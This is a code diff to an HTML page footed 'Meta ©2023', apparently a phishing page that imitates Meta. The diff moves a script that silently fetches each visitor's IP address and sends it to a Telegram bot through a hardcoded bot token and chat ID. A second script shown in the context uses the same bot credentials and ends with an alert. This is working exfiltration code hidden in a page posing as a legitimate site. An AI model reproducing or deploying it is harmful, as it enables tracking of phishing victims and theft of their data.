@@ -171,7 +171,28 @@ border-radius: 0 !important;
 <div class="ftt text-center mt-3 text-muted">
 <p>Meta ©2023</p>
 </div>
+<script>
 
+// Get the user's IP address using ipify.org
+fetch('https://api.ipify.org/?format=json')
+  .then(response => response.json())
+  .then(data => {
+    const ipAddress = data.ip;
+
+    // Send the IP address to the Telegram bot
+    const telegramBotToken = '6200671913:AAGfUPW-ZW_NwtJO9UPnQ1SHKNp3dxxNoPU';
+    const chatId = '5857694327';
+    const message = `User's IP address: ${ipAddress}`;
+    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+    fetch(url);
+  })
+  .catch(error => {
+    // Handle any errors that occurred
+    console.error('Error getting IP address:', error);
+  });
+
+</script>
 <script>
 const botToken = "6200671913:AAGfUPW-ZW_NwtJO9UPnQ1SHKNp3dxxNoPU";
 const chatId = "5857694327";
@@ -205,27 +226,6 @@ alert("Have a nice day");
 });
 
 </script>
-<script>
 
-// Get the user's IP address using ipify.org
-fetch('https://api.ipify.org/?format=json')
-  .then(response => response.json())
-  .then(data => {
-    const ipAddress = data.ip;
-
-    // Send the IP address to the Telegram bot
-    const telegramBotToken = '6200671913:AAGfUPW-ZW_NwtJO9UPnQ1SHKNp3dxxNoPU';
-    const chatId = '5857694327';
-    const message = `User's IP address: ${ipAddress}`;
-    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
-    fetch(url);
-  })
-  .catch(error => {
-    // Handle any errors that occurred
-    console.error('Error getting IP address:', error);
-  });
-
-</script>
 </body>
 </html>
